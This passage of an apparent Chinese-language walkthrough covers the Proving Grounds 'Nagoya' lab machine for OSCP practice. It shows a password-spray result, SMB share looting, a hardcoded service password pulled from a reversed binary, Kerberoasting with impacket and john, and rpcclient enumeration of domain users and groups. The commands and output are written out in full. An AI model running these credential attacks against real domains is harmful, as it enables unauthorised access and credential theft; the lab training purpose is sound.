</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:NAGOYA<span class="o">)</span> <span class="o">(</span>domain:nagoya-industries.com<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>-<span class="o">]</span> nagoya-industries.com<span class="se">\M</span>atthew.Harrison:Summer2023 STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>-<span class="o">]</span> nagoya-industries.com<span class="se">\E</span>mma.Miah:Summer2023 STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>-<span class="o">]</span> nagoya-industries.com<span class="se">\R</span>ebecca.Bell:Summer2023 STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>-<span class="o">]</span> nagoya-industries.com<span class="se">\S</span>cott.Gardner:Summer2023 STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>-<span class="o">]</span> nagoya-industries.com<span class="se">\T</span>erry.Edwards:Summer2023 STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>-<span class="o">]</span> nagoya-industries.com<span class="se">\H</span>olly.Matthews:Summer2023 STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>-<span class="o">]</span> nagoya-industries.com<span class="se">\A</span>nne.Jenkins:Summer2023 STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>-<span class="o">]</span> nagoya-industries.com<span class="se">\B</span>rett.Naylor:Summer2023 STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>-<span class="o">]</span> nagoya-industries.com<span class="se">\M</span>elissa.Mitchell:Summer2023 STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>-<span class="o">]</span> nagoya-industries.com<span class="se">\C</span>raig.Carr:Summer2023 STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>+<span class="o">]</span> nagoya-industries.com<span class="se">\F</span>iona.Clark:Summer2023 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           <span class="o">[</span>+<span class="o">]</span> Enumerated shares
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           Share           Permissions     Remark
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           -----           -----------     ------
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           ADMIN$                          Remote Admin
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           C$                              Default share
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           IPC$            READ            Remote IPC
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           NETLOGON        READ            Logon server share 
</span></span><span class="line"><span class="cl">SMB         192.168.166.21  <span class="m">445</span>    NAGOYA           SYSVOL          READ            Logon server share</span></span></code></pre></td></tr></table>
</div>
</div><p>拿到一套有效的账户名密码：<code>Fiona.Clark:Summer2023</code></p>
<p>登录SMB：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ smbclient  //192.168.166.21/SYSVOL -U Fiona.Clark%Summer2023
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sun Apr <span class="m">30</span> 14:31:25 <span class="m">2023</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sun Apr <span class="m">30</span> 14:31:25 <span class="m">2023</span>
</span></span><span class="line"><span class="cl">  nagoya-industries.com              Dr        <span class="m">0</span>  Sun Apr <span class="m">30</span> 14:31:25 <span class="m">2023</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">10328063</span> blocks of size 4096. <span class="m">4800089</span> blocks available</span></span></code></pre></td></tr></table>
</div>
</div><p>翻文件，找到一个ResetPassword目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls nagoya-industries.com<span class="se">\s</span>cripts<span class="se">\r</span>esetpassword<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  .                                   D        <span class="m">0</span>  Sun Apr <span class="m">30</span> 16:07:07 <span class="m">2023</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sun Apr <span class="m">30</span> 16:07:07 <span class="m">2023</span>
</span></span><span class="line"><span class="cl">  ResetPassword.exe                   A     <span class="m">5120</span>  Mon May  <span class="m">1</span> 01:04:02 <span class="m">2023</span>
</span></span><span class="line"><span class="cl">  ResetPassword.exe.config            A      <span class="m">189</span>  Mon May  <span class="m">1</span> 00:53:50 <span class="m">2023</span>
</span></span><span class="line"><span class="cl">  System.IO.FileSystem.AccessControl.dll      A    <span class="m">28552</span>  Tue Oct <span class="m">20</span> 11:39:30 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  System.IO.FileSystem.AccessControl.xml      A    <span class="m">65116</span>  Sat Oct <span class="m">10</span> 13:10:54 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  System.Security.AccessControl.dll      A    <span class="m">35952</span>  Sat Oct <span class="m">23</span> 16:45:08 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  System.Security.AccessControl.xml      A   <span class="m">231631</span>  Wed Oct <span class="m">20</span> 00:14:20 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  System.Security.Permissions.dll      A    <span class="m">30328</span>  Wed Oct <span class="m">19</span> 09:34:02 <span class="m">2022</span>
</span></span><span class="line"><span class="cl">  System.Security.Permissions.xml      A     <span class="m">8987</span>  Wed Oct <span class="m">19</span> 09:34:02 <span class="m">2022</span>
</span></span><span class="line"><span class="cl">  System.Security.Principal.Windows.dll      A    <span class="m">18312</span>  Tue Oct <span class="m">20</span> 11:46:28 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  System.Security.Principal.Windows.xml      A    <span class="m">90968</span>  Sat Oct <span class="m">10</span> 13:10:54 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">10328063</span> blocks of size 4096. <span class="m">4800089</span> blocks available</span></span></code></pre></td></tr></table>
</div>
</div><p>下载config和xml文件，没发现敏感信息。</p>
<h3 id="hint-2" class="heading-element"><span>Hint-2</span>
  <a href="#hint-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><blockquote>
<p><strong>Foothold 2</strong></p>
<p>Enumerate shares, find the binary and reverse engineer it. Make use of credentials you found. Keep in mind that one can still enumerate ACLs without actually getting a shell</p>
</blockquote>
<p>经过提示需要逆向分析，于是下载exe文件到本地，进行逆向。</p>
<p>将SMB ResetPassword目录下的所有文件都放到Windows x86架构的机子上，使用<a href="https://github.com/dnSpy/dnSpy"target="_blank" rel="external nofollow noopener noreferrer">dnSpy</a>工具对exe文件进行逆向，发现一组硬编码服务账户密码：<code>svc_helpdesk/U299iYRmikYTHDbPbxPoYYfa2j4x4cdg</code></p>
<p><a class="lightgallery" href="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207164251155.png?size=large" data-thumbnail="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207164251155.png?size=small" data-sub-html="<h2>image-20240207164251155</h2>"><img loading="lazy" src="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207164251155.png" alt="image-20240207164251155" srcset="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207164251155.png?size=small, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207164251155.png?size=medium 1.5x, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207164251155.png?size=large 2x" data-title="image-20240207164251155" style="--width: 1331px;--aspect-ratio: 1331 / 821;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h3 id="kerberoasting" class="heading-element"><span>Kerberoasting</span>
  <a href="#kerberoasting" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>获取SPN</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ impacket-GetUserSPNs nagoya-industries.com/fiona.clark:<span class="s1">&#39;Summer2023&#39;</span> -dc-ip 192.168.166.21 -debug -outputfile kerberoast.txt
</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright <span class="m">2022</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Connecting to 192.168.166.21, port 389, SSL False
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Total of records returned <span class="m">5</span>
</span></span><span class="line"><span class="cl">ServicePrincipalName                Name          MemberOf                                          PasswordLastSet             LastLogon                   Delegation 
</span></span><span class="line"><span class="cl">----------------------------------  ------------  ------------------------------------------------  --------------------------  --------------------------  ----------
</span></span><span class="line"><span class="cl">http/nagoya.nagoya-industries.com   svc_helpdesk  <span class="nv">CN</span><span class="o">=</span>helpdesk,CN<span class="o">=</span>Users,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com  2023-04-30 15:31:06.190955  &lt;never&gt;                                
</span></span><span class="line"><span class="cl">MSSQL/nagoya.nagoya-industries.com  svc_mssql                                                       2023-04-30 15:45:33.288595  2023-06-16 05:38:06.145798             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> CCache file is not found. Skipping...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The specified path is not correct or the KRB5CCNAME environment variable is not defined
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to connect to KDC at 192.168.166.21
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to connect to KDC at 192.168.166.21
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to connect to KDC at 192.168.166.21
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to connect to KDC at 192.168.166.21</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170950121.png?size=large" data-thumbnail="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170950121.png?size=small" data-sub-html="<h2>image-20240207170950121</h2>"><img loading="lazy" src="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170950121.png" alt="image-20240207170950121" srcset="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170950121.png?size=small, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170950121.png?size=medium 1.5x, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170950121.png?size=large 2x" data-title="image-20240207170950121" style="--width: 1080px;--aspect-ratio: 1080 / 395;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p><a class="lightgallery" href="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170959805.png?size=large" data-thumbnail="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170959805.png?size=small" data-sub-html="<h2>image-20240207170959805</h2>"><img loading="lazy" src="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170959805.png" alt="image-20240207170959805" srcset="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170959805.png?size=small, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170959805.png?size=medium 1.5x, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207170959805.png?size=large 2x" data-title="image-20240207170959805" style="--width: 1093px;--aspect-ratio: 1093 / 636;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>解密：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt kerberoast.txt
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">2</span> password hashes with <span class="m">2</span> different salts <span class="o">(</span>krb5tgs, Kerberos <span class="m">5</span> TGS etype <span class="m">23</span> <span class="o">[</span>MD4 HMAC-MD5 RC4<span class="o">])</span>
</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">Service1         <span class="o">(</span>?<span class="o">)</span>     
</span></span><span class="line"><span class="cl">1g 0:00:00:13 DONE <span class="o">(</span>2024-02-07 17:10<span class="o">)</span> 0.07189g/s 1031Kp/s 1106Kc/s 1106KC/s -xlengx-..*7¡Vamos!
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed. </span></span></code></pre></td></tr></table>
</div>
</div><p>获得第二个服务账户密码：<code>svc_mssql/Service1</code></p>
<h3 id="rpc" class="heading-element"><span>RPC</span>
  <a href="#rpc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ rpcclient -U nagoya-industries/svc_helpdesk 192.168.166.21
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>NAGOYA-INDUSTRIES<span class="se">\s</span>vc_helpdesk<span class="o">]</span>:
</span></span><span class="line"><span class="cl">rpcclient $&gt; 
</span></span><span class="line"><span class="cl"><span class="c1"># 枚举域用户</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Administrator<span class="o">]</span> rid:<span class="o">[</span>0x1f4<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Guest<span class="o">]</span> rid:<span class="o">[</span>0x1f5<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>krbtgt<span class="o">]</span> rid:<span class="o">[</span>0x1f6<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>svc_helpdesk<span class="o">]</span> rid:<span class="o">[</span>0x450<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Matthew.Harrison<span class="o">]</span> rid:<span class="o">[</span>0x452<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Emma.Miah<span class="o">]</span> rid:<span class="o">[</span>0x453<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Rebecca.Bell<span class="o">]</span> rid:<span class="o">[</span>0x454<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Scott.Gardner<span class="o">]</span> rid:<span class="o">[</span>0x455<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Terry.Edwards<span class="o">]</span> rid:<span class="o">[</span>0x456<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Holly.Matthews<span class="o">]</span> rid:<span class="o">[</span>0x457<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Anne.Jenkins<span class="o">]</span> rid:<span class="o">[</span>0x458<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Brett.Naylor<span class="o">]</span> rid:<span class="o">[</span>0x459<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Melissa.Mitchell<span class="o">]</span> rid:<span class="o">[</span>0x45a<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Craig.Carr<span class="o">]</span> rid:<span class="o">[</span>0x45b<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Fiona.Clark<span class="o">]</span> rid:<span class="o">[</span>0x45c<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Patrick.Martin<span class="o">]</span> rid:<span class="o">[</span>0x45d<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Kate.Watson<span class="o">]</span> rid:<span class="o">[</span>0x45e<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Kirsty.Norris<span class="o">]</span> rid:<span class="o">[</span>0x45f<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Andrea.Hayes<span class="o">]</span> rid:<span class="o">[</span>0x460<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Abigail.Hughes<span class="o">]</span> rid:<span class="o">[</span>0x461<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Melanie.Watson<span class="o">]</span> rid:<span class="o">[</span>0x462<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Frances.Ward<span class="o">]</span> rid:<span class="o">[</span>0x463<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Sylvia.King<span class="o">]</span> rid:<span class="o">[</span>0x464<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Wayne.Hartley<span class="o">]</span> rid:<span class="o">[</span>0x465<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Iain.White<span class="o">]</span> rid:<span class="o">[</span>0x467<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Joanna.Wood<span class="o">]</span> rid:<span class="o">[</span>0x468<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Bethan.Webster<span class="o">]</span> rid:<span class="o">[</span>0x469<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Elaine.Brady<span class="o">]</span> rid:<span class="o">[</span>0x46b<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Christopher.Lewis<span class="o">]</span> rid:<span class="o">[</span>0x46c<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Megan.Johnson<span class="o">]</span> rid:<span class="o">[</span>0x46d<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Damien.Chapman<span class="o">]</span> rid:<span class="o">[</span>0x46e<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Joanne.Lewis<span class="o">]</span> rid:<span class="o">[</span>0x46f<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>svc_mssql<span class="o">]</span> rid:<span class="o">[</span>0x470<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>svc_tpl<span class="o">]</span> rid:<span class="o">[</span>0x471<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>svc_web<span class="o">]</span> rid:<span class="o">[</span>0x472<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 枚举域内组</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomgroups
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Enterprise Read-only Domain Controllers<span class="o">]</span> rid:<span class="o">[</span>0x1f2<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Domain Admins<span class="o">]</span> rid:<span class="o">[</span>0x200<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Domain Users<span class="o">]</span> rid:<span class="o">[</span>0x201<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Domain Guests<span class="o">]</span> rid:<span class="o">[</span>0x202<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Domain Computers<span class="o">]</span> rid:<span class="o">[</span>0x203<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Domain Controllers<span class="o">]</span> rid:<span class="o">[</span>0x204<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Schema Admins<span class="o">]</span> rid:<span class="o">[</span>0x206<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Enterprise Admins<span class="o">]</span> rid:<span class="o">[</span>0x207<span class="o">]</span>
